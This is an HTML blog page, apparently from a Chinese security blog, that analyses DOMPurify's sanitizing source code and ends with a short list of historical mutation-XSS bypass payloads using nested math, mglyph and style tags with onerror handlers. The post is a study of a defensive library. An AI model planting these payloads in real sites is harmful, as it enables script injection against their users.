@@ -1,0 +1,271 @@
+<!DOCTYPE html>
+<html>
+
+<head><meta name="generator" content="Hexo 3.9.0">
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="description" content>
+
+<link rel="shortcut icon" href="https://ws1.sinaimg.cn/large/005IUN3mly1g71rwo5k7bj30hs0hsmxx.jpg">
+
+
+<title> DOMPurify源码小探究</title>
+
+
+<link rel="stylesheet" href="/css/bulma.css">
+<link rel="stylesheet" href="/css/font-awesome.min.css">
+    <link rel="stylesheet" href="/css/base.css">
+</head>
+<body>
+
+  <style media="screen">
+hr {
+  height: 1px;
+    background-color: black;
+    margin-top: 0px;
+    border: none;
+    margin-bottom: 0px;
+}
+.black {
+
+
+background-color: hsl(0,0%,7%);;
+
+
+}
+ #shadow {
+  text-shadow: 2px 3px 3px white;
+  margin-top: 3px;
+}
+h1 {
+  text-shadow: 2px 3px 3px black;
+ }
+.menu {
+margin-top: -80px;
+
+
+
+
+}
+#nav {
+  margin-left: 2px;
+  margin-right: 2px;
+}
+  #banner {
+    position: relative;
+
+  }
+</style>
+<header>
+
+  <section class="section black is-medium" id="banner">
+    <div class="container">
+      <h1 id="sitetitle" class="title is-3 has-text-white-bis has-text-centered is-capitalized has-text-weight-bold">
+        
+        Deen&#39;s blog
+      </h1>
+
+      <h2 id="shadow" class="subtitle is-4 has-text-white is-capitalized has-text-centered">
+
+      </h2>
+
+    </div>
+
+    </div>
+  </section>
+<!--TOP Menu-->
+  <div class="menu level" >
+<div class="level-item has-text-centered"></div>
+    <nav class=".navbar level-item" >
+      
+        <a style="text-shadow: 2px 2px 3px grey" id="nav" class="button is-text is-outlined is-primary " href="
+
+
+            /archives
+            "> Archive</a>
+        
+        <a style="text-shadow: 2px 2px 3px grey" id="nav" class="button is-text is-outlined is-primary " href="
+
+
+            /about
+            "> About</a>
+        
+    </nav>
+    <div class="level-item has-text-centered"></div>
+</div>
+
+  <hr>
+
+
+
+
+
+
+</header>
+
+
+
+<link rel="stylesheet" href="/css/highlight.css">
+<style>
+    .markdown-body {
+        box-sizing: border-box;
+        min-width: 200px;
+        max-width: 960px;
+        margin: 0 auto;
+        padding: 45px;
+    }
+
+    @media (max-width: 767px) {
+        .markdown-body {
+            padding: 15px;
+        }
+    }
+    #postsec {
+        clear: left;
+    }
+
+
+
+    .details {
+        float: left;
+        padding-left: 10px;
+        font-size: 18px;
+
+    }
+    div > span {
+       margin-left: 0px;
+      margin-top: 0px;
+    }
+</style>
+<section id="post_section" class="container markdown-body" >
+
+    <!--title,date,tags-->
+    <h2 id="hidden">
+        DOMPurify源码小探究
+    </h2>
+
+    <section class="desec">
+
+        
+    </section>
+
+
+    <!-- content -->
+    <section id="postsec"><h2 id="0x00-DOMPurify-介绍"><a href="#0x00-DOMPurify-介绍" class="headerlink" title="0x00 DOMPurify 介绍"></a>0x00 DOMPurify 介绍</h2><p>DOMPurify是一个开源的基于DOM的快速XSS净化工具。输入HTML元素，然后通过DOM解析递归元素节点，进行净化，输出安全的HTML。<br>github地址：<a href="https://github.com/cure53/DOMPurify" target="_blank" rel="noopener">https://github.com/cure53/DOMPurify</a><br>现在最新版本：2.2.8<br><img src="https://lh3.googleusercontent.com/pw/ACtC-3fDirn9WfP_XwoxdlvgllEe9ihnifE802myfVhNEc-dLsMJ_bihCyOkmAhs-NjP5QNBo4F6-bASeiW_7IJsBN79WM-IpMWJHnmqg9nb-XzzT-lFJ7NTUbuS3m9TLdzsa6Oqr7vFkX-KvW4UFZmQEZ9m=w784-h455-no?authuser=0" alt="官方介绍"></p>
+<h2 id="0x01-常见使用"><a href="#0x01-常见使用" class="headerlink" title="0x01 常见使用"></a>0x01 常见使用</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">const createDOMPurify = require(&apos;dompurify&apos;);</span><br><span class="line">const &#123; JSDOM &#125; = require(&apos;jsdom&apos;);</span><br><span class="line"></span><br><span class="line">const window = new JSDOM(&apos;&apos;).window;</span><br><span class="line">const DOMPurify = createDOMPurify(window);</span><br><span class="line"></span><br><span class="line">const clean = DOMPurify.sanitize(&quot;&lt;img/src=x onerror=alert(1)&gt;&quot;);</span><br></pre></td></tr></table></figure>
+
+<p>这段代码最后输出 <code>&lt;img src=&quot;x&quot;&gt;</code></p>
+<p>DOMPurify.sanitize 函数是最常见的用法，也可以接两个参数，第二个参数位为相关配置。可参考官方文档。</p>
+<h2 id="0x02-调试探究"><a href="#0x02-调试探究" class="headerlink" title="0x02 调试探究"></a>0x02 调试探究</h2><p>DOMPurify使用到了ES6中语法，我打算通过webstorm使用node进行调试，所以还需要一些操作，如下（可参考：<a href="https://www.cnblogs.com/arxive/p/12254008.html" target="_blank" rel="noopener">Node.js 中使用 ES6 中的 import / export 的方法大全</a>）：  </p>
+<ol>
+<li><p>将此目录的下的代码 <code>https://github.com/cure53/DOMPurify/tree/main/src</code> 全部拉下来，后缀名改成mjs。</p>
+</li>
+<li><p>自己的main.js代码为 </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">import createDOMPurify from &quot;./DOMPurify-main/src/purify.mjs&quot;;</span><br><span class="line">import JSDOM from &apos;jsdom&apos;;</span><br><span class="line">const window = new JSDOM.JSDOM(&apos;&apos;).window;</span><br><span class="line">const DOMPurify = createDOMPurify(window);</span><br><span class="line">const html = &quot;&lt;img/src=x onerror=alert(1)&gt;&quot;;</span><br><span class="line">console.log(DOMPurify.sanitize(html));</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>node添加启动参数–experimental-modules</p>
+</li>
+</ol>
+<p><img src="https://lh3.googleusercontent.com/pw/ACtC-3fhnz8nKrG8d5zwsYsPvApnngP442ZMyBD1qd1GSw2NRI-nAZZGt1vgC_4yYinLDAMUrY9QBqwyrVi3yWKkVPWenCick_JrL3k41g9dLX0LHRYwOCf3Q8U8BJUd27PII7h-j_Rhp0bHVS3vRsUUtLLh=w1048-h321-no?authuser=0" alt="启动参数"></p>
+<h2 id="0x03-sanitize代码跟进"><a href="#0x03-sanitize代码跟进" class="headerlink" title="0x03 sanitize代码跟进"></a>0x03 sanitize代码跟进</h2><h3 id="主要代码"><a href="#主要代码" class="headerlink" title="主要代码"></a>主要代码</h3><p>跟进分析santize函数主要代码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">const nodeIterator = _createIterator(IN_PLACE ? dirty : body);</span><br><span class="line"></span><br><span class="line">/* Now start iterating over the created document */</span><br><span class="line">while ((currentNode = nodeIterator.nextNode())) &#123;</span><br><span class="line">  /* Fix IE&apos;s strange behavior with manipulated textNodes #89 */</span><br><span class="line">  if (currentNode.nodeType === 3 &amp;&amp; currentNode === oldNode) &#123;</span><br><span class="line">    continue;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  /* Sanitize tags and elements */</span><br><span class="line">  if (_sanitizeElements(currentNode)) &#123;</span><br><span class="line">    continue;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  /* Shadow DOM detected, sanitize it */</span><br><span class="line">  if (currentNode.content instanceof DocumentFragment) &#123;</span><br><span class="line">   _sanitizeShadowDOM(currentNode.content);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  /* Check attributes, sanitize if necessary */</span><br><span class="line">  _sanitizeAttributes(currentNode);</span><br><span class="line"></span><br><span class="line">  oldNode = currentNode;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">oldNode = null;</span><br></pre></td></tr></table></figure>
+
+<p>dirty 为待净化的对象，即我们输入的数据。</p>
+<ol>
+<li>首先通过<code>_createIterator</code> 函数以及<code>while ((currentNode = nodeIterator.nextNode()))</code>，会将输入元素转化成逐个的HTMLelement 元素。如 <code>&lt;img src=x&gt;&lt;svg src=x&gt;</code>会转成img和svg两个元素</li>
+<li>然后进入while的body进行操作，此时currentNode即img和svg元素。</li>
+<li>会有两个净化操作，一个是<code>_sanitizeElements</code>，一个是<code>_sanitizeAttributes</code> 。</li>
+<li><code>_sanitizeElements</code> 函数，顾名思义，即净化标签</li>
+<li><code>_sanitizeAttributes</code> 即净化标签的属性</li>
+</ol>
+<h3 id="sanitizeElements函数"><a href="#sanitizeElements函数" class="headerlink" title="_sanitizeElements函数"></a>_sanitizeElements函数</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">/* Check if tagname contains Unicode */</span><br><span class="line">if (stringMatch(currentNode.nodeName, /[\u0080-\uFFFF]/)) &#123;</span><br><span class="line">  _forceRemove(currentNode);</span><br><span class="line">  return true;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/* Now let&apos;s check the element&apos;s type and name */</span><br><span class="line">const tagName = stringToLowerCase(currentNode.nodeName);</span><br></pre></td></tr></table></figure>
+
+<p>标签名字包含unicode字符的，直接移除。然后标签名同一转成小写。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">if (!ALLOWED_TAGS[tagName] || FORBID_TAGS[tagName]) &#123;</span><br><span class="line">  /* Keep content except for bad-listed elements */</span><br><span class="line">  if (KEEP_CONTENT &amp;&amp; !FORBID_CONTENTS[tagName]) &#123;</span><br><span class="line">    const parentNode = getParentNode(currentNode) || currentNode.parentNode;</span><br><span class="line">    const childNodes = getChildNodes(currentNode) || currentNode.childNodes;</span><br><span class="line"></span><br><span class="line">    if (childNodes &amp;&amp; parentNode) &#123;</span><br><span class="line">      const childCount = childNodes.length;</span><br><span class="line"></span><br><span class="line">      for (let i = childCount - 1; i &gt;= 0; --i) &#123;</span><br><span class="line">        parentNode.insertBefore(</span><br><span class="line">          cloneNode(childNodes[i], true),</span><br><span class="line">          getNextSibling(currentNode)</span><br><span class="line">        );</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  _forceRemove(currentNode);</span><br><span class="line">  return true;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>过滤不在白名单的标签，白名单在tags.js。  </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">export const html = freeze([</span><br><span class="line">  &apos;a&apos;,</span><br><span class="line">  &apos;abbr&apos;,</span><br><span class="line">  &apos;acronym&apos;,</span><br><span class="line">  &apos;address&apos;,</span><br><span class="line">  &apos;area&apos;,</span><br><span class="line">  &apos;article&apos;,</span><br><span class="line">  &apos;aside&apos;,</span><br><span class="line">  &apos;audio&apos;,</span><br><span class="line">  &apos;b&apos;,</span><br><span class="line">  ......</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">/* Check whether element has a valid namespace */</span><br><span class="line">if (currentNode instanceof Element &amp;&amp; !_checkValidNamespace(currentNode)) &#123;</span><br><span class="line">  _forceRemove(currentNode);</span><br><span class="line">  return true;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if (</span><br><span class="line">  (tagName === &apos;noscript&apos; || tagName === &apos;noembed&apos;) &amp;&amp;</span><br><span class="line">  regExpTest(/&lt;\/no(script|embed)/i, currentNode.innerHTML)</span><br><span class="line">) &#123;</span><br><span class="line">  _forceRemove(currentNode);</span><br><span class="line">  return true;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>校验命名空间，曾经有过bypass，下面还有个对noscript标签的校验操作，感觉有点多余，因为不在白名单里，已经在上面就被remove了。</p>
+<h3 id="sanitizeAttributes函数"><a href="#sanitizeAttributes函数" class="headerlink" title="_sanitizeAttributes函数"></a>_sanitizeAttributes函数</h3><p>首先不管是什么属性，都直接从当前currentNode remove。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">if (hookEvent.forceKeepAttr) &#123;</span><br><span class="line">continue;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/* Remove attribute */</span><br><span class="line">_removeAttribute(name, currentNode);</span><br><span class="line"></span><br><span class="line">/* Did the hooks approve of the attribute? */</span><br><span class="line">if (!hookEvent.keepAttr) &#123;</span><br><span class="line">continue;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>然后根据标签名，还有属性名，属性的值进行一个<code>_isValidAttribute</code> 的判断。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">const lcTag = currentNode.nodeName.toLowerCase();</span><br><span class="line">if (!_isValidAttribute(lcTag, lcName, value)) &#123;</span><br><span class="line">continue;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>如果是合法的attr，则调用setAttribute方法将attr进行还原。 </p>
+<p>关键的<code>_isValidAttribute</code> 函数。 可以调试尝试绕过….nice try….</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">if (ALLOW_DATA_ATTR &amp;&amp; regExpTest(DATA_ATTR, lcName)) &#123;</span><br><span class="line">  // This attribute is safe</span><br><span class="line">&#125; else if (ALLOW_ARIA_ATTR &amp;&amp; regExpTest(ARIA_ATTR, lcName)) &#123;</span><br><span class="line">  // This attribute is safe</span><br><span class="line">  /* Otherwise, check the name is permitted */</span><br><span class="line">&#125; else if (!ALLOWED_ATTR[lcName] || FORBID_ATTR[lcName]) &#123;</span><br><span class="line">  return false;</span><br><span class="line"></span><br><span class="line">  /* Check value is safe. First, is attr inert? If so, is safe */</span><br><span class="line">&#125; else if (URI_SAFE_ATTRIBUTES[lcName]) &#123;</span><br><span class="line">  // This attribute is safe</span><br><span class="line">  /* Check no script, data or unknown possibly unsafe URI</span><br><span class="line">    unless we know URI values are safe for that attribute */</span><br><span class="line">&#125; else if (</span><br><span class="line">  regExpTest(IS_ALLOWED_URI, stringReplace(value, ATTR_WHITESPACE, &apos;&apos;))</span><br><span class="line">) &#123;</span><br><span class="line">  // This attribute is safe</span><br><span class="line">  /* Keep image data URIs alive if src/xlink:href is allowed */</span><br><span class="line">  /* Further prevent gadget XSS for dynamically built script tags */</span><br><span class="line">&#125; else if (</span><br><span class="line">  (lcName === &apos;src&apos; || lcName === &apos;xlink:href&apos; || lcName === &apos;href&apos;) &amp;&amp;</span><br><span class="line">  lcTag !== &apos;script&apos; &amp;&amp;</span><br><span class="line">  stringIndexOf(value, &apos;data:&apos;) === 0 &amp;&amp;</span><br><span class="line">  DATA_URI_TAGS[lcTag]</span><br><span class="line">) &#123;</span><br><span class="line">  // This attribute is safe</span><br><span class="line">  /* Allow unknown protocols: This provides support for links that</span><br><span class="line">    are handled by protocol handlers which may be unknown ahead of</span><br><span class="line">    time, e.g. fb:, spotify: */</span><br><span class="line">&#125; else if (</span><br><span class="line">  ALLOW_UNKNOWN_PROTOCOLS &amp;&amp;</span><br><span class="line">  !regExpTest(IS_SCRIPT_OR_DATA, stringReplace(value, ATTR_WHITESPACE, &apos;&apos;))</span><br><span class="line">) &#123;</span><br><span class="line">  // This attribute is safe</span><br><span class="line">  /* Check for binary attributes */</span><br><span class="line">  // eslint-disable-next-line no-negated-condition</span><br><span class="line">&#125; else if (!value) &#123;</span><br><span class="line">  // Binary attributes are safe at this point</span><br><span class="line">  /* Anything else, presume unsafe, do not add it back */</span><br><span class="line">&#125; else &#123;</span><br><span class="line">  return false;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x04-历史Bypass"><a href="#0x04-历史Bypass" class="headerlink" title="0x04 历史Bypass"></a>0x04 历史Bypass</h2><p>可以在pull requests 和 releases的更新日志找到， 如：<br>混淆命名空间绕过：<a href="https://github.com/cure53/DOMPurify/pull/495" target="_blank" rel="noopener">https://github.com/cure53/DOMPurify/pull/495</a> </p>
+<p><img src="https://lh3.googleusercontent.com/pw/ACtC-3fEo6cby6ZUtAusBfHX-74tREmjgtUfQLJe3AfU0kKgVU7YGn6bMFFvMIF3UEjBh3aHBQ0ItICwdAETR9CSgW28de8PEWM8X-23r698-zC1D5iena4XhBIk23IV3oJ-HFLm3WhRcXn_A44CbAtk7_QA=w693-h740-no?authuser=0" alt="更新日志"></p>
+<p>payloads：</p>
+<ul>
+<li><code>&lt;form&gt;&lt;math&gt;&lt;mtext&gt;&lt;/form&gt;&lt;form&gt;&lt;mglyph&gt;&lt;style&gt;&lt;/math&gt;&lt;img src onerror=alert(1)&gt;</code></li>
+<li><code>&lt;svg&gt;&lt;/p&gt;&lt;style&gt;&lt;a id=&quot;&lt;/style&gt;&lt;img src=1 onerror=alert(1)&gt;&quot;&gt;</code></li>
+<li><code>&lt;math&gt;&lt;mtext&gt;&lt;table&gt;&lt;mglyph&gt;&lt;style&gt;&lt;!--&lt;/style&gt;&lt;img title=&quot;--&amp;gt;&amp;lt;img src=1 onerror=alert(1)&amp;gt;&quot;&gt;</code></li>
+<li><code>&lt;form&gt;&lt;math&gt;&lt;mtext&gt;&lt;/form&gt;&lt;form&gt;&lt;mglyph&gt;&lt;svg&gt;&lt;mtext&gt;&lt;style&gt;&lt;path id=&quot;&lt;/style&gt;&lt;img onerror=alert(\&#39;XSS\&#39;) src&gt;&quot;&gt;</code></li>
+</ul>
+
+    </section>
+
+
+</section>
+<script>var title = document.getElementById("hidden");
+    title.style.display = "none";
+    sitetitle = document.getElementById("sitetitle");
+    titlev = title.childNodes[0].nodeValue;
+    sitetitle.innerHTML = titlev;
+    shadow = document.getElementById("shadow");
+    shadow.style.visibility = "hidden";
+</script>
+<!-- 评论系统-->
+
+
+
+
+
+<style>
+    #height {
+        height: 100px;
+        box-sizing: border-box;
+        color: rgb(51, 51, 51);
+        font-size: 18px;
+        font-weight: 400;
+
+    }
+
+    .footer_p {
+        box-sizing: border-box;
+        font-size: 18px;
+        font-weight: 200;
+        line-height: 27px;
+        text-align: center;
+        text-rendering: optimizelegibility;
+    }
+
+    .footer_link {
+        color: black;
+    }
+</style>
+<script src="/js/jquery.js"></script>
+
+<!-- 特效 -->
+<script type="text/javascript" color="#555" opacity='0.9' zIndex="-1" count="100"
+src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js">
+
+</script>
+<script src="/js/highlight.pack.js"></script>
+<script>
+    document.addEventListener("DOMContentLoaded", function(event) {
+        var codeBlocks = Array.prototype.slice.call(document.getElementsByTagName('pre'))
+        codeBlocks.forEach(function(block, index) {
+            hljs.highlightBlock(block);
+        });
+    });
+</script>
+
+</body>
